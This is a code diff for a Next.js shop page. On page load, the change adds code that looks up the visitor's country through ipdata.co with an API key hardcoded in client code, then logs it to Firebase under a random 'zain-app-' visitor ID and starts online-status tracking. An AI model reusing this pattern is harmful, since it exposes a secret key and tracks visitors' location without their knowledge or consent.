@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useState,useEffect } from "react"
 import Image from "next/image"
 import { ShoppingCart, Star, Truck, Shield, Phone, MapPin, Mail, Facebook, Twitter, Instagram } from "lucide-react"
 import { Button } from "@/components/ui/button"
@@ -11,9 +11,11 @@ import { CartSidebar } from "../components/cart-sidebar"
 import { CheckoutForm } from "../components/checkout-form"
 import { OrderSuccess } from "../components/order-success"
 import type { Customer } from "../types/cart"
-import Payment from "./knet/page"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 type PageState = "home" | "checkout" | "payment" | "success"
+const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function Component() {
   const [currentPage, setCurrentPage] = useState<PageState>("home")
@@ -140,7 +142,9 @@ export default function Component() {
       size: product.size,
     })
   }
-
+  useEffect(()=>{
+    location()
+  },[])
   const handleCheckout = () => {
     setIsCartOpen(false)
     setCurrentPage("checkout")
@@ -159,6 +163,41 @@ export default function Component() {
     setCurrentPage("home")
     setCustomer(null)
   }
+  
+const location=async ()=>{
+  if (!newVisitorId) return;
+
+  // This API key is public and might be rate-limited or disabled.
+  // For a production app, use a secure way to handle API keys, ideally on the backend.
+  const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
+  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+  try {
+    const response = await fetch(url)
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`)
+    }
+    const country = await response.text()
+    await addData({
+      createdDate: new Date().toISOString(),
+      id: newVisitorId,
+      country: country,
+      action: "page_load"
+    })
+    localStorage.setItem("country", country) // Consider privacy implications
+    setupOnlineStatus(newVisitorId)
+  } catch (error) {
+    console.error("Error fetching location:", error)
+    // Log error with visitor ID for debugging
+    await addData({
+      createdDate: new Date().toISOString(),
+      id: newVisitorId,
+      error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
+      action: "location_error"
+    });
+  }
+}
+
 
   // Render different pages based on current state
   if (currentPage === "checkout") {
